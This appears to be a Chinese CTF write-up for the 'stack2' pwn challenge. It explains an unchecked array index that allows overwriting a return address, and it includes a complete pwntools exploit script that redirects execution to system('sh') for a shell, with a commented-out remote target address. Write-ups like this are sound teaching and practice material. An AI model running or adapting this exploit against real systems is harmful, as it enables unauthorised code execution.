# stack2

本题思路：利用数组越界的特性，覆写调用函数的返回地址。

此题难点在于计算偏移量和十六进制字符串到十进制整型数组的转换

## 具体步骤

1. 常规检查：`file`, `checksec`, `strings`

2. 用IDA分析，看到“3. change number”功能下的array[count] = num未进行边际检查，因此有数组越界漏洞。

![](1.jpg)

3. 使用GDB动态分析，确定array数组的起始位置，计算数组起始位置至ebp、返回地址的距离。

![](2.jpg)

4. 代码实现POC
```python
import pwn

# hextoint()把每个字节的字符串型十六进制数转换成int型
# e.g. "deadbeef" -> [0xde, 0xad, 0xbe, 0xef]
def hextoint(str1):
    s = []
    i = 0
    for j in range(len(str1) // 2):
        s.append(int(str1[i:i+2], 16))
        i += 2
    return s


pwn.context(arch='i386', os='linux', log_level='debug')

p = pwn.process('./3fb1a42837be485aae7d85d11fbc457b')   # 本地连接                                                                   
#p = pwn.remote('220.249.52.133', 54376)    # 远程连接                                                                               
                                                                                                                                  
elf = pwn.ELF('./3fb1a42837be485aae7d85d11fbc457b')                                                                 
system_addr = '0' + hex(elf.plt['system'])[2:]       # 调整为 '08048450'，方便按字节转换为整型
sh_addr = '0' + hex(next(elf.search(b'sh')))[2:]     # 调整为 '08048987'，方便按字节转换为整型                          
                                                                                                                    
system_addr = hextoint(system_addr)[::-1]     # hextoint()把每个字节的字符串型十六进制数转换成int型，如：[80, 132, 4, 8]    
sh_addr = hextoint(sh_addr)[::-1]             # [135, 137, 4, 8]

p.sendlineafter(b'How many numbers you have:', b'1')
p.sendlineafter(b'Give me your numbers', b'1')

position1 = [132, 133, 134, 135]    # 返回地址偏移量
position2 = [140, 141, 142, 143]    # system()参数的偏移量

for i in range(4):
    p.sendlineafter(b'5. exit', b'3')
    p.sendlineafter(b'which number to change:', str(position1[i]).encode())
    p.sendlineafter(b'new number:', str(system_addr[i]).encode())

for i in range(4):
    p.sendlineafter(b'5. exit', b'3')
    p.sendlineafter(b'which number to change:', str(position2[i]).encode())
    p.sendlineafter(b'new number:', str(sh_addr[i]).encode())

p.sendlineafter(b'5. exit', b'5')

p.interactive()
```